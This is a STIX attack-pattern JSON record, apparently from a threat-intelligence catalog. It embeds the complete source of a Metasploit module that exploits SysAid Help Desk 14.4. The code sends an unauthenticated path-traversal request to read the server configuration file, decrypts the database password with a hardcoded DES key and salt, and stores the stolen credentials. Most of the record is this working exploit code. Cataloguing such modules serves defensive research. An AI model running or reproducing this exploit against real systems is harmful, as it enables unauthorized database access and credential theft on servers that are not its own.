{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--28d086b2-7493-4407-b53e-a77f45eeb5a1",
    "created": "2024-08-14T16:23:48.288465Z",
    "modified": "2024-08-14T16:23:48.288469Z",
    "name": "SysAid Help Desk Database Credentials Disclosure",
    "description": " This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated user to download arbitrary files from the system. This is used to download the server configuration file that contains the database username and password, which is encrypted with a fixed, known key. This module has been tested with SysAid 14.4 on Windows and Linux. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/sysaid_sql_creds.rb",
            "external_id": "sysaid_sql_creds.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2996"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2998"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jun/8"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SysAid Help Desk Database Credentials Disclosure',\n        'Description' => %q{\n          This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated\n          user to download arbitrary files from the system. This is used to download the server\n          configuration file that contains the database username and password, which is encrypted\n          with a fixed, known key. This module has been tested with SysAid 14.4 on Windows and Linux.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2015-2996'],\n          ['CVE', '2015-2998'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Jun/8'],\n          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt']\n        ],\n        'DisclosureDate' => '2015-06-03'\n      )\n    )\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 8080]),\n        OptString.new('TARGETURI', [ true, 'SysAid path', '/sysaid']),\n      ]\n    )\n  end\n\n  def decrypt_password(ciphertext)\n    salt = [-87, -101, -56, 50, 86, 53, -29, 3].pack('c*')\n    cipher = OpenSSL::Cipher.new('DES')\n    base_64_code = Rex::Text.decode_base64(ciphertext)\n    cipher.decrypt\n    cipher.pkcs5_keyivgen 'inigomontoya', salt, 19\n\n    plaintext = cipher.update base_64_code\n    plaintext << cipher.final\n    plaintext\n  end\n\n  def run\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(datastore['TARGETURI'], 'getGfiUpgradeFile'),\n        'vars_get' => {\n          'fileName' => '../conf/serverConf.xml'\n        }\n      })\n    rescue Rex::ConnectionRefused\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect.\")\n    end\n\n    if res && res.code == 200 && res.body.to_s.bytesize != 0\n      username = %r{<dbUser>(.*)</dbUser>}.match(res.body.to_s)\n      encrypted_password = %r{<dbPassword>(.*)</dbPassword>}.match(res.body.to_s)\n      database_url = %r{<dbUrl>(.*)</dbUrl>}.match(res.body.to_s)\n      database_type = %r{<dbType>(.*)</dbType>}.match(res.body.to_s)\n\n      unless username && encrypted_password && database_type && database_url\n        fail_with(Failure::Unknown, \"#{peer} - Failed to obtain database credentials.\")\n      end\n\n      username = username.captures[0]\n      encrypted_password = encrypted_password.captures[0]\n      database_url = database_url.captures[0]\n      database_type = database_type.captures[0]\n      password = decrypt_password(encrypted_password[6..encrypted_password.length])\n      credential_core = report_credential_core({\n        password: password,\n        username: username\n      })\n\n      matches = %r{(\\w*):(\\w*)://(.*)/(\\w*)}.match(database_url)\n      if matches\n        begin\n          db_address = matches.captures[2]\n          if database_url['localhost'] == 'localhost'\n            db_port = db_address[(db_address.index(':') + 1)..(db_address.length - 1)].to_i\n            db_address = rhost\n          else\n            if db_address.index(':')\n              db_address = db_address[0, db_address.index(':')]\n              db_port = db_address[db_address.index(':')..(db_address.length - 1)].to_i\n            else\n              db_port = 0\n            end\n            db_address = Rex::Socket.getaddress(db_address, true)\n          end\n          database_login_data = {\n            address: db_address,\n            service_name: database_type,\n            protocol: 'tcp',\n            port: db_port,\n            workspace_id: myworkspace_id,\n            core: credential_core,\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }\n          create_credential_login(database_login_data)\n        # Skip creating the Login, but tell the user about it if we cannot resolve the DB Server Hostname\n        rescue SocketError\n          fail_with(Failure::Unknown, 'Could not resolve database server hostname.')\n        end\n\n        print_good(\"Stored SQL credentials #{username}:#{password} for #{matches.captures[2]}\")\n        return\n      end\n    else\n      fail_with(Failure::NotVulnerable, \"#{peer} - Failed to obtain database credentials, response was: #{res ? res.code : 'unknown'}\")\n    end\n  end\n\n  def report_credential_core(cred_opts = {})\n    # use a basic core only since this credential is not known valid for service it was obtained from.\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      private_type: :password,\n      private_data: cred_opts[:password],\n      username: cred_opts[:username]\n    }\n    create_credential(credential_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-03"
}